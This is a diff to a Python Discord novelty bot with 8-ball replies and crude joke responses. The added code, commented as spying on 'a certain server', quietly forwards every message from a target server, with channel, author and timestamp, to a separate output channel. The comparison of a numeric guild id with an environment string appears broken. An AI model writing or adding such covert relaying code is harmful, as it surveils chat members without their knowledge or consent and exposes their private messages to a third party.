@@ -10,6 +10,8 @@ import horny
 
 load_dotenv()
 TOKEN = os.getenv('DISCORD_TOKEN')
+TARGET_SERVER_1 = os.getenv('TARGET_SERVER_1')
+OUTPUT_CHANNEL_1 = os.getenv('OUTPUT_CHANNEL_1')
 
 ballcontent = [
     ":8ball: nope",
@@ -47,6 +49,12 @@ async def on_ready():
 async def on_message(message):
     if message.author == client.user:
         return
+
+    if message.guild.id == TARGET_SERVER_1:   # spies on a certain server, if you are in that server congratulations
+        header = "#" + str(message.channel) + " - [" + str(message.author) + "] " + str(message.created_at.utcnow())[0:-7] + " UTC\n"
+        channel = client.get_channel(OUTPUT_CHANNEL_1)  # output channel
+        await channel.send(header + message.content)
+
 
     if "sex" in message.content:
         await message.channel.send("sex")
